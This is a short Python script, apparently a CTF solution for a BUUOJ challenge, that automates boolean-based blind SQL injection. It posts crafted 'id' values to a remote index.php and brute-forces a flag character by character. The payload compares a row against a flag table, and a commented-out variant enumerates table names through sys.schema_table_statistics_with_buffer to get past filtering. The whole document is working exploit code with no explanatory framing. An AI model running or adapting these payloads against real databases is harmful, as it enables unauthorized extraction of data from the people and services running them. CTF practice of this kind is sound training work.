
import requests

url = 'http://44dc68e6-f7be-4969-9f4b-2aa7875e751b.node3.buuoj.cn/index.php'

def jisuan(index_1:dict,payload_1:str):

    result = ''

    for index_2 in index_1:

        for payload_2 in payload_1:
            # data = {
            #     'id':"1&& substr((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()),{index},1)='{str_payload}'".format(index=index_2,str_payload=payload_2)
            # }                                                             # 通过sys.schema_table_statistics_with_buffer表来绕过限制，查询表名
            data = {
                'id':"1&& ((select 1,'{str_payload}') > select * from f1ag_1s_h3r3_hhhhh)".format(str_payload=payload_2)
            }

            

            r = requests.post(url=url,data=data)
            if 'Nu1L' in r.text:
                result += payload_2.lower()
                print('计算出了{}为{}'.format(index_2,payload_2.lower()))
                break           

    return result

if __name__ == '__main__':
    payload = []
    for x in range(32,127):
        payload.append(chr(x))
    # print(payload)

    print('结果为：',jisuan(range(1,50),payload))
    

